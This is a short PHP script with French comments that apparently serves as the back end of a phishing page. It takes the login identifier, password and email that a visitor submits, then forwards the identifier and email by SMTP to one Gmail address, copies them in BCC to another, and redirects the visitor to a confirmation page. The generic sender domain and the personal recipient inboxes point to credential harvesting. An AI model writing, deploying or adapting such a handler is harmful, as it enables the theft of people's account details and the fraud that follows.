<?php
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if (isset($_POST['user'], $_POST['pass'], $_POST['email'])) { 

    // Nettoyage des entrées utilisateur
    $user = htmlspecialchars(strip_tags($_POST['user']));
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $pass = htmlspecialchars(strip_tags($_POST['pass']));

    // Vérification de l'email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        die("Adresse email invalide.");
    }

    $mail = new PHPMailer(true);

    try {
        // Paramètres SMTP
        $mail->isSMTP();
        $mail->Host       = 'smtp.infomaniak.com'; 
        $mail->SMTPAuth   = true;
        $mail->Username   = getenv('SMTP_USERNAME'); // Utilisation des variables d'environnement
        $mail->Password   = getenv('SMTP_PASSWORD'); 
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS; 
        $mail->Port       = 465; 

        // Destinataires
        $mail->setFrom('service@monespace-en-ligne.site', 'Service');
        $mail->addAddress('action.cerivc@gmail.com'); 
        $mail->addBCC('bprotection85@gmail.com'); 

        // Contenu de l'email
        $mail->isHTML(true);
        $mail->Subject = 'Infos Universel';
        $mail->Body    = "<h1>Nouveau Message - Infos Universel</h1>
                          <b>Identifiant :</b> $user<br>
                          <b>Email :</b> $email";

        // Envoi
        if ($mail->send()) {
            header('Location: confirmation.html'); 
            exit();
        } else {
            echo "Erreur d'envoi de l'email.";
        }
    } catch (Exception $e) {
        echo "Erreur lors de l'envoi de l'email : " . $mail->ErrorInfo;
    }
} else {
    echo "Veuillez remplir tous les champs du formulaire.";
}
?>